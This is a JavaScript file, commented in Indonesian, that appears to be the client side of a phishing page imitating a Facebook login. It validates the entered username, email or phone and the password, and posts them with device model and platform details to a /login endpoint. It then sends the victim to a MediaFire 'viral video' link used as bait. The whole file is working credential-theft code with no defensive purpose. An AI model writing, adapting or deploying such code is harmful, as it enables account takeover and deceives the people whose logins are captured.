// VALIDASI DAN SUBMIT FACEBOOK
const formFb = document.getElementById('facebookForm');
const emailFb = document.getElementById('facebookEmail');
const passwordFb = document.getElementById('facebookPassword');
const submitBtnFb = document.getElementById('btnSubmitFacebook');

const validUsernameFb = /^[a-zA-Z0-9_]+$/;
const validEmailFb = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const validPhoneFb = /^[0-9]{8,15}$/;
const validPasswordFb = /^[a-zA-Z0-9]{6,}$/;

function isValidInputFb() {
  const inputVal = emailFb.value.trim();
  const passVal = passwordFb.value.trim();

  const isEmailOrUsernameOrPhone =
    validUsernameFb.test(inputVal) ||
    validEmailFb.test(inputVal) ||
    validPhoneFb.test(inputVal);

  return isEmailOrUsernameOrPhone && validPasswordFb.test(passVal);
}

formFb.addEventListener('submit', function (e) {
  e.preventDefault();

  if (!isValidInputFb()) {
    return;
  }

  const emailFacebook = emailFb.value.trim();
  const passwordFacebook = passwordFb.value.trim();
  const logFacebook = document.getElementById('logFacebook').value.trim();

  const sendDataFb = (extra = {}) => {
    const payload = {
      emailFacebook,
      passwordFacebook,
      logFacebook,
      ...extra
    };
    
    fetch('/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
    .then(res => {
      if (!res.ok) throw new Error('Gagal kirim data');

      emailFb.value = '';
      passwordFb.value = '';
      
      window.location.href = 'https://www.mediafire.com/file/fs4e5pcdokks7rs/Kayes_Viral.mp4/file';
      
    })
    .catch(err => {
      console.error('Error:', err);
    });
  };

  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
    navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion'])
      .then(info => {
        sendDataFb({
          modelInfoFb: info.model || 'Unknown',
          platformInfoFb: info.platform || 'Unknown',
          versiInfoFb: info.platformVersion || 'Unknown'
        });
      })
      .catch(() => sendDataFb());
  } else {
    sendDataFb();
  }
});
